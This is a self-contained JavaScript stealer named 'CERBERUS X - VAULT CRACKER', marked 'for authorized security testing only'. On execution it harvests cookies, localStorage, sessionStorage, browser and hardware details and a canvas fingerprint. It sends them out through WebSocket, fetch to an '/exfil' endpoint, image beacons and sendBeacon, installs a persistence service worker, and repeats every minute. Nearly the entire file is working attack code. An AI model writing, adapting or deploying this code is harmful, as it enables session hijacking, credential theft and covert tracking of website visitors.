/**
 * CERBERUS X - VAULT CRACKER v2.0
 * Complete browser data extraction with stealth
 * 
 * Copyright (c) 2024 F1REW0LF
 * License: MIT - For authorized security testing only
 */

(function() {
    'use strict';
    
    // ==================== CONFIG ====================
    const WS_URL = `ws://${location.host}`;
    const MAX_RETRIES = 3;
    let retryCount = 0;
    
    // ==================== DATA COLLECTION ====================
    function collectAllData() {
        const data = {
            // Storage
            localStorage: {},
            sessionStorage: {},
            cookies: {},
            
            // Browser info
            browser: {},
            hardware: {},
            
            // Network
            network: {},
            
            // Extensions
            extensions: [],
            
            // History (if accessible)
            history: [],
            
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer
        };
        
        // === LocalStorage ===
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                data.localStorage[key] = localStorage.getItem(key);
            }
        } catch(e) {}
        
        // === SessionStorage ===
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                data.sessionStorage[key] = sessionStorage.getItem(key);
            }
        } catch(e) {}
        
        // === Cookies ===
        try {
            document.cookie.split(';').forEach(cookie => {
                const parts = cookie.trim().split('=');
                if (parts.length === 2) {
                    data.cookies[parts[0]] = parts[1];
                }
            });
        } catch(e) {}
        
        // === IndexedDB ===
        try {
            const dbNames = [];
            indexedDB.webkitGetDatabaseNames().onsuccess = (event) => {
                const cursor = event.target.result;
                while (cursor.continue()) {
                    dbNames.push(cursor.value);
                }
                data.indexedDB = dbNames;
            };
        } catch(e) {}
        
        // === Browser Info ===
        data.browser = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            vendor: navigator.vendor,
            product: navigator.product,
            productSub: navigator.productSub,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            appCodeName: navigator.appCodeName,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            webdriver: navigator.webdriver
        };
        
        // === Screen ===
        data.screen = {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation ? screen.orientation.type : 'unknown'
        };
        
        // === Network ===
        if (navigator.connection) {
            data.network = {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            };
        }
        
        // === Plugins ===
        try {
            data.extensions = Array.from(navigator.plugins).map(p => ({
                name: p.name,
                filename: p.filename,
                description: p.description
            }));
        } catch(e) {}
        
        // === Canvas Fingerprint ===
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 256;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('CerberusX', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Security', 4, 45);
            data.canvasFingerprint = canvas.toDataURL().substring(0, 100);
        } catch(e) {}
        
        return data;
    }
    
    // ==================== EXFILTRATION ====================
    function exfiltrate(data) {
        const payload = {
            type: 'VAULT_DUMP',
            ip: location.hostname,
            content: data
        };
        
        // Method 1: WebSocket
        try {
            const ws = new WebSocket(WS_URL);
            ws.onopen = () => {
                ws.send(JSON.stringify(payload));
                ws.close();
            };
            ws.onerror = () => {
                // Fallback to other methods
                exfiltrateFallback(data);
            };
        } catch(e) {
            exfiltrateFallback(data);
        }
    }
    
    function exfiltrateFallback(data) {
        // Method 2: Fetch
        try {
            fetch(`http://${location.host}/exfil`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data),
                mode: 'no-cors'
            });
        } catch(e) {}
        
        // Method 3: Image beacon
        try {
            const img = new Image();
            const encoded = encodeURIComponent(JSON.stringify(data));
            img.src = `http://${location.host}/collect?data=${encoded}`;
        } catch(e) {}
        
        // Method 4: sendBeacon
        try {
            navigator.sendBeacon(`http://${location.host}/beacon`, 
                JSON.stringify(data));
        } catch(e) {}
    }
    
    // ==================== PERSISTENCE ====================
    function setupServiceWorker() {
        if ('serviceWorker' in navigator) {
            try {
                navigator.serviceWorker.register('/ghost_sw.js', {
                    scope: '/'
                }).then(() => {
                    console.log('[+] Service Worker installed');
                }).catch(() => {
                    console.log('[-] Service Worker registration failed');
                });
            } catch(e) {}
        }
    }
    
    // ==================== EXECUTION ====================
    function execute() {
        try {
            const data = collectAllData();
            exfiltrate(data);
            setupServiceWorker();
            
            // Re-execute periodically
            setInterval(() => {
                try {
                    const newData = collectAllData();
                    exfiltrate(newData);
                } catch(e) {}
            }, 60000); // Every minute
            
        } catch(e) {
            if (retryCount < MAX_RETRIES) {
                retryCount++;
                setTimeout(execute, 1000 * retryCount);
            }
        }
    }
    
    // Start
    execute();
})();
